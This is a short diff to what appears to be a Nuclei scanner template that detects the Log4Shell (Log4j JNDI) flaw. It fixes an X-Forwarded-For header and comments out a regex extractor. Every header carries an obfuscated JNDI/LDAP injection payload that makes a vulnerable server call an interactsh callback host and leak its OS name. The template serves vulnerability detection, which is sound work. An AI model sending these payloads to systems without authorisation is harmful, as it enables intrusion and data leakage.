@@ -18,7 +18,7 @@ requests:
         Host: {{Hostname}}
         User-Agent: ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://${sys:os.name}.{{interactsh-url}}/a}
         Referer: ${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://${sys:os.name}.{{interactsh-url}}/a}
-        X-Forwarded-For: ${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://${}.{{interactsh-url}}/a}
+        X-Forwarded-For: ${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://${sys:os.name}.{{interactsh-url}}/a}
         X-Api-Version: ${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://${sys:os.name}.{{interactsh-url}}/a}
         Authentication: ${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://${sys:os.name}.{{interactsh-url}}/a}
 
@@ -40,9 +40,9 @@ requests:
         words:
           - "http"
 
-    extractors:
-      - type: regex
-        part: interactsh_request
-        group: 1
-        regex:
-          - '([a-z0-9\.\-]+)\.([a-z0-9]+)\.interactsh\.com'   # Extract ${sys:os.name}
+  #  extractors:
+  #   - type: regex
+  #      part: interactsh_request
+  #      group: 1
+  #    regex:
+  #       - '([a-z0-9\.\-]+)\.([a-z0-9]+)\.interactsh\.com'   # Extract ${sys:os.name}
